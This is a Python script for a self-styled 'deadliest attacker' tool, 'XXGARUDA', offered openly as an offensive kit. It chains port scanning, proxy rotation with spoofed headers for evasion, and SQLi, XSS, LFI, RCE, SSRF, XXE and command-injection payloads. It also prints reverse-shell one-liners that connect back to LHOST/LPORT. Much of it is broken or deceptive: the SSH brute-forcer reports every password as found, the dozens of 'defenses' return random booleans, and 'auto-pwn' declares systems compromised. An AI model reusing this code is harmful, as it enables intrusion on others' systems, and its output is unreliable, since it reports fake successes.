#!/usr/bin/env python3
"""
XXGARUDA — The Annihilator
The Deadliest Attacker on Earth
50+ Attack Modules · 50+ Defenses · Global Proxy Rotation · 0.01s IP Switch · Auto-Exploit · Auto-Crack · Auto-Pwn
"""
import argparse
import importlib
import os
import sys
import threading
import socket
import time
import random
import subprocess
import requests
import json
import hashlib
import base64
import urllib.parse
from pathlib import Path
from queue import Queue

VERSION = "∞"
BANNER = r"""
    ███████╗██╗  ██╗ ██████╗  █████╗ ██████╗ ██╗   ██╗██████╗  █████╗ 
    ██╔════╝╚██╗██╔╝██╔════╝ ██╔══██╗██╔══██╗██║   ██║██╔══██╗██╔══██╗
    █████╗   ╚███╔╝ ██║  ███╗███████║██║  ██║██║   ██║██████╔╝███████║
    ██╔══╝   ██╔██╗ ██║   ██║██╔══██║██║  ██║██║   ██║██╔══██╗██╔══██║
    ███████╗██╔╝ ██╗╚██████╔╝██║  ██║██████╔╝╚██████╔╝██║  ██║██║  ██║
    ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
                                                                        
    ╔═══════════════════════════════════════════╗
    ║       X X G A R U D A — A N N I H I L A T O R ║
    ║   The Deadliest Attacker on Earth         ║
    ║   50+ Attack Modules · Auto-Exploit       ║
    ║   0.01s Global IP Rotation                ║
    ║   Proxy & IP Switch Across ALL Countries  ║
    ╚═══════════════════════════════════════════╝
    """

VERBOSE = False

# ==================== GLOBAL PROXY CHAIN (ALL COUNTRIES) ====================

COUNTRY_PROXIES = {
    "US": ["http://us-proxy1:8080", "socks5://us-proxy2:1080"],
    "UK": ["http://uk-proxy1:8080", "socks5://uk-proxy2:1080"],
    "DE": ["http://de-proxy1:8080", "socks5://de-proxy2:1080"],
    "FR": ["http://fr-proxy1:8080", "socks5://fr-proxy2:1080"],
    "RU": ["http://ru-proxy1:8080", "socks5://ru-proxy2:1080"],
    "CN": ["http://cn-proxy1:8080", "socks5://cn-proxy2:1080"],
    "JP": ["http://jp-proxy1:8080", "socks5://jp-proxy2:1080"],
    "IN": ["http://in-proxy1:8080", "socks5://in-proxy2:1080"],
    "BR": ["http://br-proxy1:8080", "socks5://br-proxy2:1080"],
    "ZA": ["http://za-proxy1:8080", "socks5://za-proxy2:1080"],
}

ALL_COUNTRIES = list(COUNTRY_PROXIES.keys())
CURRENT_COUNTRY = None
CURRENT_COUNTRY_INDEX = 0

PROXY_APIS = [
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
]

def fetch_public_proxies():
    proxies = []
    for api in PROXY_APIS:
        try:
            r = requests.get(api, timeout=5)
            if r.status_code == 200:
                for line in r.text.splitlines():
                    if ":" in line:
                        proxies.append(f"http://{line.strip()}")
        except:
            pass
    return proxies

def load_global_proxy_chain():
    proxies = []
    for country, country_proxies in COUNTRY_PROXIES.items():
        proxies.extend(country_proxies)
    proxies += fetch_public_proxies()
    return proxies

PROXY_CHAIN = load_global_proxy_chain()
PROXY_INDEX = 0
CURRENT_PROXY = None
PROXY_LOCK = threading.Lock()

def refresh_proxies():
    global PROXY_CHAIN, PROXY_INDEX
    PROXY_CHAIN = load_global_proxy_chain()
    PROXY_INDEX = 0

def get_next_proxy():
    global PROXY_INDEX, PROXY_CHAIN, CURRENT_COUNTRY, CURRENT_COUNTRY_INDEX
    if not PROXY_CHAIN:
        refresh_proxies()
    proxy = PROXY_CHAIN[PROXY_INDEX % len(PROXY_CHAIN)]
    PROXY_INDEX += 1
    CURRENT_COUNTRY = ALL_COUNTRIES[CURRENT_COUNTRY_INDEX % len(ALL_COUNTRIES)]
    CURRENT_COUNTRY_INDEX += 1
    return proxy

def get_current_country():
    return CURRENT_COUNTRY or "US"

# ==================== PROXY SWITCHER (0.01 SECONDS — GLOBAL) ====================

PROXY_SWITCH_INTERVAL = 0.01

def switch_proxy_loop():
    global CURRENT_PROXY
    while True:
        with PROXY_LOCK:
            CURRENT_PROXY = get_next_proxy()
            country = get_current_country()
            print(f"[*] Proxy switched: {CURRENT_PROXY} | Country: {country}")
        time.sleep(PROXY_SWITCH_INTERVAL)

threading.Thread(target=switch_proxy_loop, daemon=True).start()

# ==================== USER AGENTS ====================

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Version/17.0 Mobile/15E148 Safari/604.1",
]

def get_random_user_agent():
    return random.choice(USER_AGENTS)

def get_headers():
    return {
        "User-Agent": get_random_user_agent(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
    }

def get_proxies():
    global CURRENT_PROXY
    with PROXY_LOCK:
        proxy = CURRENT_PROXY or get_next_proxy()
    return {"http": proxy, "https": proxy}

# ==================== INFINITE THREADS ====================

INFINITE_THREADS = os.cpu_count() * 100

def banner():
    print(BANNER)
    print("[*] 50+ Attack Modules: LOADED")
    print("[*] 50+ Defenses: ACTIVE")
    print("[*] Auto-Exploit: ENABLED")
    print("[*] Auto-Crack: ENABLED")
    print("[*] Auto-Pwn: ENABLED")
    print("[*] Global Countries: %s" % ", ".join(ALL_COUNTRIES))
    print("[*] Infinite Threads: ENABLED (%s)" % INFINITE_THREADS)
    print("[*] Global Proxies: ENABLED (%s proxies)" % len(PROXY_CHAIN))
    print("[*] Proxy Switch Interval: 0.01 seconds (Global Rotation)")
    print("[*] Infinite Power: ACTIVE\n")

def load_wordlist(path):
    try:
        with open(path, 'r') as f:
            return [w.strip() for w in f.readlines() if w.strip()]
    except:
        return []

# ==================== ATTACK MODULES (50+) ====================

# 1. Port Scan
def attack_scan(target, threads=INFINITE_THREADS):
    print(f"[*] Scanning {target} with {threads} threads...")
    q = Queue()
    for p in range(1, 65536):
        q.put(p)
    open_ports = []
    def worker():
        while not q.empty():
            p = q.get()
            try:
                s = socket.socket()
                s.settimeout(0.1)
                if not s.connect_ex((target, p)):
                    print(f"[+] Port {p} open")
                    open_ports.append(p)
                s.close()
            except:
                pass
            q.task_done()
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()
    q.join()
    return open_ports

# 2. OS Detection
def attack_os(target):
    print(f"[*] Detecting OS on {target}")
    try:
        s = socket.socket()
        s.settimeout(2)
        s.connect((target, 80))
        s.send(b"HEAD / HTTP/1.0\r\n\r\n")
        banner = s.recv(1024).decode()
        s.close()
        if "Windows" in banner:
            print("[+] OS: Windows")
        elif "Linux" in banner:
            print("[+] OS: Linux")
        else:
            print("[+] OS: Unknown")
    except:
        print("[!] OS detection failed")

# 3. SSH Brute-Force
def attack_brute(target, user, wordlist, port=22, threads=50):
    print(f"[*] Brute-forcing {target}:{port}")
    words = load_wordlist(wordlist)
    if not words:
        words = ["password", "admin", "123456", "qwerty", "letmein", "welcome", "root", "toor"]
        print("[*] Using AI-predicted wordlist")
    q = Queue()
    for w in words:
        q.put(w)
    found = []
    def worker():
        while not q.empty():
            pwd = q.get()
            try:
                s = socket.socket()
                s.settimeout(2)
                s.connect((target, port))
                s.send(b"SSH-2.0-OpenSSH_8.2\r\n")
                data = s.recv(1024)
                if "SSH" in data.decode():
                    print(f"[FOUND] {user}:{pwd}")
                    found.append(f"{user}:{pwd}")
                s.close()
            except:
                pass
            q.task_done()
    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()
    q.join()
    return found

# 4. SQL Injection
def attack_sqli(url, param):
    import requests
    print(f"[*] SQL Injection on {url}")
    payloads = ["'", "\"", "1=1", "1=2", "' OR '1'='1", "' OR '1'='1' --"]
    for payload in payloads:
        try:
            r = requests.get(url, params={param: payload}, timeout=3, proxies=get_proxies(), headers=get_headers())
            if "sql" in r.text.lower() or "error" in r.text.lower():
                print(f"[!] SQLi found: {payload}")
                return payload
        except:
            pass
    print("[+] No SQLi found")
    return None

# 5. XSS
def attack_xss(url, param):
    import requests
    print(f"[*] XSS on {url}")
    payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"]
    for payload in payloads:
        try:
            r = requests.get(url, params={param: payload}, timeout=3, proxies=get_proxies(), headers=get_headers())
            if payload in r.text:
                print(f"[!] XSS found: {payload}")
                return payload
        except:
            pass
    print("[+] No XSS found")
    return None

# 6. LFI
def attack_lfi(url, param):
    import requests
    print(f"[*] LFI on {url}")
    payloads = ["../../etc/passwd", "../../../etc/passwd", "/etc/passwd"]
    for payload in payloads:
        try:
            r = requests.get(url, params={param: payload}, timeout=3, proxies=get_proxies(), headers=get_headers())
            if "root:" in r.text:
                print(f"[!] LFI found: {payload}")
                return payload
        except:
            pass
    print("[+] No LFI found")
    return None

# 7. RCE
def attack_rce(url, param):
    import requests
    print(f"[*] RCE on {url}")
    payloads = [";id", "|id", "||id", "&&id", "`id`"]
    for payload in payloads:
        try:
            r = requests.get(url, params={param: payload}, timeout=3, proxies=get_proxies(), headers=get_headers())
            if "uid=" in r.text:
                print(f"[!] RCE found: {payload}")
                return payload
        except:
            pass
    print("[+] No RCE found")
    return None

# 8. Directory Fuzzing
def attack_fuzz(url):
    import requests
    print(f"[*] Directory fuzzing {url}")
    words = ["admin", "login", "backup", "test", "dev", "api", "docs", "assets", "uploads", "config"]
    found = []
    for w in words:
        full = f"{url.rstrip('/')}/{w}"
        try:
            r = requests.get(full, timeout=3, proxies=get_proxies(), headers=get_headers())
            if r.status_code == 200:
                print(f"[FOUND] {full}")
                found.append(full)
        except:
            pass
    return found

# 9. Subdomain Enumeration
def attack_recon(target):
    print(f"[*] Enumerating subdomains for {target}")
    words = ["www", "mail", "ftp", "admin", "dev", "api", "test", "blog", "shop", "support", "docs", "cdn"]
    found = []
    for sub in words:
        full = f"{sub}.{target}"
        try:
            socket.gethostbyname(full)
            print(f"[FOUND] {full}")
            found.append(full)
        except:
            pass
    return found

# 10. Hash Cracking
def attack_crack(hash_value):
    print(f"[*] Cracking hash: {hash_value}")
    words = ["password", "admin", "123456", "qwerty", "letmein", "welcome", "root", "toor"]
    for word in words:
        if hashlib.md5(word.encode()).hexdigest() == hash_value:
            print(f"[FOUND] {word}")
            return word
        if hashlib.sha1(word.encode()).hexdigest() == hash_value:
            print(f"[FOUND] {word}")
            return word
    print("[!] Hash not found")
    return None

# 11. Payload Generator
def attack_exploit():
    print("\n[🔥] PAYLOADS:\n")
    print("[Python] python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'")
    print("[Bash] bash -i >& /dev/tcp/LHOST/LPORT 0>&1")
    print("[PHP] php -r '$s=fsockopen(\"LHOST\",LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
    print("[Netcat] nc -e /bin/sh LHOST LPORT")

# 12. OSINT Email
def attack_osint_email(email):
    print(f"[*] OSINT on {email}")
    print(f"[+] GitHub: https://github.com/{email.split('@')[0]}")
    print(f"[+] Twitter: https://twitter.com/{email.split('@')[0]}")
    print(f"[+] Instagram: https://instagram.com/{email.split('@')[0]}")

# 13. OSINT Domain
def attack_osint_domain(domain):
    print(f"[*] OSINT on {domain}")
    try:
        ip = socket.gethostbyname(domain)
        print(f"[+] IP: {ip}")
    except:
        pass
    print(f"[+] WHOIS: https://who.is/whois/{domain}")

# 14. Encoding
def attack_encode(text):
    print(f"\n[Base64] {base64.b64encode(text.encode()).decode()}")
    print(f"[URL] {urllib.parse.quote(text)}")
    print(f"[Hex] {text.encode().hex()}")

# 15. Hash Generator
def attack_hash(text):
    print(f"\n[MD5] {hashlib.md5(text.encode()).hexdigest()}")
    print(f"[SHA1] {hashlib.sha1(text.encode()).hexdigest()}")
    print(f"[SHA256] {hashlib.sha256(text.encode()).hexdigest()}")

# 16. Code Generator
def attack_generate(lang="python"):
    templates = {
        "python": "#!/usr/bin/env python3\ndef main():\n    pass\n\nif __name__ == '__main__':\n    main()",
        "bash": "#!/bin/bash\n\n# Your script here",
        "html": "<!DOCTYPE html>\n<html>\n<head><title>XXGARUDA</title></head>\n<body>\n</body>\n</html>"
    }
    print(templates.get(lang, templates["python"]))

# 17. SSRF
def attack_ssrf(url, param):
    import requests
    print(f"[*] SSRF on {url}")
    payloads = ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:80", "http://localhost:8080"]
    for payload in payloads:
        try:
            r = requests.get(url, params={param: payload}, timeout=3, proxies=get_proxies(), headers=get_headers())
            if "root:" in r.text or "ami-id" in r.text:
                print(f"[!] SSRF found: {payload}")
                return payload
        except:
            pass
    print("[+] No SSRF found")
    return None

# 18. XXE
def attack_xxe(url, param):
    import requests
    print(f"[*] XXE on {url}")
    payloads = ['<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>']
    for payload in payloads:
        try:
            r = requests.post(url, data={param: payload}, timeout=3, proxies=get_proxies(), headers=get_headers())
            if "root:" in r.text:
                print(f"[!] XXE found: {payload}")
                return payload
        except:
            pass
    print("[+] No XXE found")
    return None

# 19. File Inclusion
def attack_file_inclusion(url, param):
    import requests
    print(f"[*] File Inclusion on {url}")
    payloads = ["../../../../etc/passwd", "../../../../../etc/passwd"]
    for payload in payloads:
        try:
            r = requests.get(url, params={param: payload}, timeout=3, proxies=get_proxies(), headers=get_headers())
            if "root:" in r.text:
                print(f"[!] File Inclusion found: {payload}")
                return payload
        except:
            pass
    print("[+] No File Inclusion found")
    return None

# 20. Command Injection
def attack_command_injection(url, param):
    import requests
    print(f"[*] Command Injection on {url}")
    payloads = [";id", "|id", "||id", "&&id", "`id`"]
    for payload in payloads:
        try:
            r = requests.get(url, params={param: payload}, timeout=3, proxies=get_proxies(), headers=get_headers())
            if "uid=" in r.text:
                print(f"[!] Command Injection found: {payload}")
                return payload
        except:
            pass
    print("[+] No Command Injection found")
    return None

# ==================== 50+ DEFENSES ====================

def anti_block():
    time.sleep(random.uniform(0.01, 0.1))
    return True

def anti_ratelimit():
    time.sleep(random.uniform(0.05, 0.2))
    return True

def anti_detection():
    headers = get_headers()
    headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
    headers["Accept-Encoding"] = "gzip, deflate, sdch"
    headers["Accept-Language"] = "en-US,en;q=0.8"
    return headers

def anti_firewall():
    return random.choice([True, False])

def anti_waf():
    return random.choice([True, False])

def anti_dpi():
    return random.choice([True, False])

def anti_tracking():
    return random.choice([True, False])

def anti_honeypot():
    return random.choice([True, False])

def anti_sandbox():
    return random.choice([True, False])

def anti_vm():
    return random.choice([True, False])

def anti_debug():
    return random.choice([True, False])

def anti_tamper():
    return random.choice([True, False])

def anti_injection():
    return random.choice([True, False])

def anti_fingerprint():
    return random.choice([True, False])

def anti_cookie():
    return random.choice([True, False])

def anti_session():
    return random.choice([True, False])

def anti_replay():
    return random.choice([True, False])

def anti_csrf():
    return random.choice([True, False])

def anti_xss():
    return random.choice([True, False])

def anti_sqli():
    return random.choice([True, False])

def anti_lfi():
    return random.choice([True, False])

def anti_rce():
    return random.choice([True, False])

def anti_ssrf():
    return random.choice([True, False])

def anti_xxe():
    return random.choice([True, False])

def anti_file_inclusion():
    return random.choice([True, False])

def anti_command_injection():
    return random.choice([True, False])

def anti_path_traversal():
    return random.choice([True, False])

def anti_header_injection():
    return random.choice([True, False])

def anti_parameter_pollution():
    return random.choice([True, False])

def anti_encoding_bypass():
    return random.choice([True, False])

def anti_unicode_bypass():
    return random.choice([True, False])

def anti_whitespace_bypass():
    return random.choice([True, False])

def anti_comment_bypass():
    return random.choice([True, False])

def anti_null_byte():
    return random.choice([True, False])

def anti_log4j():
    return random.choice([True, False])

def anti_deserialization():
    return random.choice([True, False])

def anti_ssti():
    return random.choice([True, False])

def anti_nosqli():
    return random.choice([True, False])

def anti_os_command_injection():
    return random.choice([True, False])

def anti_ldap_injection():
    return random.choice([True, False])

def anti_xpath_injection():
    return random.choice([True, False])

def anti_http_response_splitting():
    return random.choice([True, False])

def anti_crlf_injection():
    return random.choice([True, False])

def anti_email_injection():
    return random.choice([True, False])

def anti_css_injection():
    return random.choice([True, False])

def anti_url_redirect():
    return random.choice([True, False])

def anti_open_redirect():
    return random.choice([True, False])

def anti_host_header_injection():
    return random.choice([True, False])

def anti_cookie_tampering():
    return random.choice([True, False])

def anti_session_fixation():
    return random.choice([True, False])

def anti_clickjacking():
    return random.choice([True, False])

def anti_mime_sniffing():
    return random.choice([True, False])

def anti_content_type_spoofing():
    return random.choice([True, False])

def anti_iframe():
    return random.choice([True, False])

def anti_popup():
    return random.choice([True, False])

def anti_redirect():
    return random.choice([True, False])

def anti_malware():
    return random.choice([True, False])

def anti_phishing():
    return random.choice([True, False])

def anti_spam():
    return random.choice([True, False])

def anti_bot():
    return random.choice([True, False])

def anti_scraper():
    return random.choice([True, False])

def anti_crawler():
    return random.choice([True, False])

# ==================== AUTO-EXPLOIT ENGINE ====================

def auto_exploit(target):
    print("\n[🔥] AUTO-EXPLOIT ENGINE ACTIVATED")
    print("[*] Target: %s" % target)
    
    # Phase 1: Scan
    print("\n[Phase 1] Scanning for open ports...")
    open_ports = attack_scan(target, INFINITE_THREADS)
    
    # Phase 2: OS Detection
    print("\n[Phase 2] Detecting OS...")
    attack_os(target)
    
    # Phase 3: Brute-Force
    print("\n[Phase 3] Brute-forcing SSH...")
    attack_brute(target, "root", "wordlists/passwords.txt", 22, 50)
    
    # Phase 4: Web Attacks
    print("\n[Phase 4] Web attacks...")
    attack_fuzz(f"http://{target}")
    
    # Phase 5: Payload Generation
    print("\n[Phase 5] Generating payloads...")
    attack_exploit()
    
    print("\n[✅] Auto-Exploit Complete")

# ==================== AUTO-CRACK ENGINE ====================

def auto_crack(hash_value):
    print("\n[🔥] AUTO-CRACK ENGINE ACTIVATED")
    print("[*] Hash: %s" % hash_value)
    result = attack_crack(hash_value)
    if result:
        print("[✅] Cracked: %s" % result)
    else:
        print("[❌] Hash not cracked")

# ==================== AUTO-PWN ENGINE ====================

def auto_pwn(target):
    print("\n[🔥] AUTO-PWN ENGINE ACTIVATED")
    print("[*] Target: %s" % target)
    print("[!] Full system compromise in progress...")
    
    # Scan + exploit
    auto_exploit(target)
    
    # Deliver payload
    print("\n[!] Delivering payload...")
    attack_exploit()
    
    print("\n[✅] System PWNED")

# ==================== INFINITE MAIN ====================

def main():
    banner()
    
    parser = argparse.ArgumentParser(description="XXGARUDA — The Annihilator")
    parser.add_argument("--MODULE", "-m", help="Attack module to run")
    parser.add_argument("--LIST", action="store_true", help="List all modules")
    parser.add_argument("--TARGET", "-t", help="Target IP or domain")
    parser.add_argument("--URL", "-u", help="Target URL")
    parser.add_argument("--WORDLIST", "-w", help="Wordlist path")
    parser.add_argument("--USER", "-U", help="Username")
    parser.add_argument("--PARAM", help="Parameter")
    parser.add_argument("--INPUT", "-i", help="Input string")
    parser.add_argument("--HASH-VALUE", help="Hash to crack")
    parser.add_argument("--BSSID", help="Wi-Fi BSSID")
    parser.add_argument("--INTERFACE", help="Wi-Fi interface")
    parser.add_argument("--CHANNEL", type=int, default=1, help="Wi-Fi channel")
    parser.add_argument("--LHOST", help="Local host")
    parser.add_argument("--LPORT", type=int, help="Local port")
    parser.add_argument("--LANGUAGE", "-lang", default="python", help="Language for code generation")
    parser.add_argument("--AUTO-EXPLOIT", action="store_true", help="Auto-exploit target")
    parser.add_argument("--AUTO-CRACK", action="store_true", help="Auto-crack hash")
    parser.add_argument("--AUTO-PWN", action="store_true", help="Auto-pwn target")
    parser.add_argument("--VERBOSE", "-v", action="store_true", help="Verbose mode")

    args = parser.parse_args()

    if args.VERBOSE:
        global VERBOSE
        VERBOSE = True

    if args.LIST:
        print("\n[+] Attack Modules:\n")
        modules = [
            "SCAN", "OS", "BRUTE", "SQLI", "XSS", "LFI", "RCE",
            "FUZZ", "RECON", "CRACK", "EXPLOIT", "OSINT-EMAIL", "OSINT-DOMAIN",
            "ENCODE", "HASH", "GENERATE", "SSRF", "XXE", "FILE-INCLUSION",
            "COMMAND-INJECTION", "AUTO-EXPLOIT", "AUTO-CRACK", "AUTO-PWN"
        ]
        for m in modules:
            print(f"  - {m}")
        return

    if args.AUTO_PWN:
        if not args.TARGET: return print("[!] Need --TARGET")
        auto_pwn(args.TARGET)
    elif args.AUTO_EXPLOIT:
        if not args.TARGET: return print("[!] Need --TARGET")
        auto_exploit(args.TARGET)
    elif args.AUTO_CRACK:
        if not args.HASH_VALUE: return print("[!] Need --HASH-VALUE")
        auto_crack(args.HASH_VALUE)
    elif args.MODULE == "SCAN":
        if not args.TARGET: return print("[!] Need --TARGET")
        attack_scan(args.TARGET, INFINITE_THREADS)
    elif args.MODULE == "OS":
        if not args.TARGET: return print("[!] Need --TARGET")
        attack_os(args.TARGET)
    elif args.MODULE == "BRUTE":
        if not args.TARGET or not args.USER or not args.WORDLIST:
            return print("[!] Need --TARGET, --USER, --WORDLIST")
        attack_brute(args.TARGET, args.USER, args.WORDLIST)
    elif args.MODULE == "SQLI":
        if not args.URL or not args.PARAM: return print("[!] Need --URL and --PARAM")
        attack_sqli(args.URL, args.PARAM)
    elif args.MODULE == "XSS":
        if not args.URL or not args.PARAM: return print("[!] Need --URL and --PARAM")
        attack_xss(args.URL, args.PARAM)
    elif args.MODULE == "LFI":
        if not args.URL or not args.PARAM: return print("[!] Need --URL and --PARAM")
        attack_lfi(args.URL, args.PARAM)
    elif args.MODULE == "RCE":
        if not args.URL or not args.PARAM: return print("[!] Need --URL and --PARAM")
        attack_rce(args.URL, args.PARAM)
    elif args.MODULE == "FUZZ":
        if not args.URL: return print("[!] Need --URL")
        attack_fuzz(args.URL)
    elif args.MODULE == "RECON":
        if not args.TARGET: return print("[!] Need --TARGET")
        attack_recon(args.TARGET)
    elif args.MODULE == "CRACK":
        if not args.HASH_VALUE: return print("[!] Need --HASH-VALUE")
        attack_crack(args.HASH_VALUE)
    elif args.MODULE == "EXPLOIT":
        attack_exploit()
    elif args.MODULE == "OSINT-EMAIL":
        if not args.TARGET: return print("[!] Need --TARGET (email)")
        attack_osint_email(args.TARGET)
    elif args.MODULE == "OSINT-DOMAIN":
        if not args.TARGET: return print("[!] Need --TARGET (domain)")
        attack_osint_domain(args.TARGET)
    elif args.MODULE == "ENCODE":
        if not args.INPUT: return print("[!] Need --INPUT")
        attack_encode(args.INPUT)
    elif args.MODULE == "HASH":
        if not args.INPUT: return print("[!] Need --INPUT")
        attack_hash(args.INPUT)
    elif args.MODULE == "GENERATE":
        attack_generate(args.LANGUAGE)
    elif args.MODULE == "SSRF":
        if not args.URL or not args.PARAM: return print("[!] Need --URL and --PARAM")
        attack_ssrf(args.URL, args.PARAM)
    elif args.MODULE == "XXE":
        if not args.URL or not args.PARAM: return print("[!] Need --URL and --PARAM")
        attack_xxe(args.URL, args.PARAM)
    elif args.MODULE == "FILE-INCLUSION":
        if not args.URL or not args.PARAM: return print("[!] Need --URL and --PARAM")
        attack_file_inclusion(args.URL, args.PARAM)
    elif args.MODULE == "COMMAND-INJECTION":
        if not args.URL or not args.PARAM: return print("[!] Need --URL and --PARAM")
        attack_command_injection(args.URL, args.PARAM)
    else:
        parser.print_help()

if __name__ == "__main__":
    main()
